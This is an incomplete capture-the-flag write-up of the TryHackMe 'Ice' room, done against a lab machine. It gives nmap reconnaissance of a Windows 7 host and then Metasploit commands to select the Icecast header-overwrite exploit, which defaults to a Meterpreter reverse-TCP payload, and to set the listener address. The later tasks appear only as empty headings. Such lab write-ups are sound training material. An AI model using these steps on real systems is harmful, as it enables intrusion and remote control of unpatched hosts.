Information
- **Name:** Ice
- **Profile:** [tryhackme.com](https://tryhackme.com/room/ice)
- **Difficulty:** Easy
- **Description**: Deploy & hack into a Windows machine, exploiting a very poorly secured media server
- 
# Task 2  Recon
- Scan and enumerate our victim!
- port scanning using nmap
~~~
──(root㉿sploit)-[/home/alpha/ctf/ice]
└─# nmap 192.168.197.145                                                        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-15 09:20 EDT
Nmap scan report for 192.168.197.145
Host is up (0.00038s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi
8000/tcp  open  http-alt
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 00:0C:29:7B:FA:FD (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds
~~~
step two scan for all ports
~~~
# Nmap 7.93 scan initiated Tue Aug 15 09:20:55 2023 as: nmap -p135,139,445,5357,49153,49155,49156,49157,8000 -A -T4 -oN nmap.txt 192.168.197.145
Nmap scan report for 192.168.197.145
Host is up (0.00049s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http         Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49153/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 00:0C:29:7B:FA:FD (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-15T07:21:58-05:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 000c297bfafd (VMware)
|_clock-skew: mean: 40m00s, deviation: 2h53m12s, median: -1h00m00s
| smb2-time: 
|   date: 2023-08-15T12:21:58
|_  start_date: 2023-08-15T11:57:31

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.197.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 15 09:22:03 2023 -- 1 IP address (1 host up) scanned in 68.72 seconds
~~~
# Task 3  Gain Access
![](ice.png)
- Exploit the target vulnerable service to gain a foothold!
- Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? [Use](https://www.cvedetails.com) for this question and the next.


#2 What is the CVE number for this vulnerability? This will be in the format: CVE-0000–0000
![](icecast streaming media server exploit.png)


#3 Now that we’ve found our vulnerability, let’s find our exploit. For this section of the room, we’ll use the Metasploit module associated with this exploit. Let’s go ahead and start Metasploit using the command `msfconsole`
![](msfconsole)
~~~
┌──(alpha㉿sploit)-[~/ctf/ice]
└─$ msfconsole    
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                        
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                        
%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%                                                        
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                        
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                        
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                        
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                        
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                        
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                        
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                        
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                        
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                        
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                        
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                        
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                        
                                                                                                                                     

       =[ metasploit v6.3.31-dev                          ]
+ -- --=[ 2346 exploits - 1217 auxiliary - 413 post       ]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Start commands with a space to avoid saving 
them to history
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
~~~
#4 After Metasploit has started, let’s search for our target exploit using the command ‘search icecast’. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in ‘RP: Metasploit’ which is recommended to be completed prior to this room, although not entirely necessary.
~~~
msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

msf6 >
~~~
#5
Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result. 
~~~
msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/icecast_header) >
~~~
#6 Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?
~~~
msf6 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasp
                                      loit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.3      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/http/icecast_header) >
~~~
First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`
~~~
msf6 exploit(windows/http/icecast_header) > set LHOST 10.8.5.88
LHOST => 10.8.5.88
msf6 exploit(windows/http/icecast_header) > 
~~~

# Task 4  Escalate
# Task 5  Looting
# Task 6  Post-Exploitation
# Task 7  Extra Credit
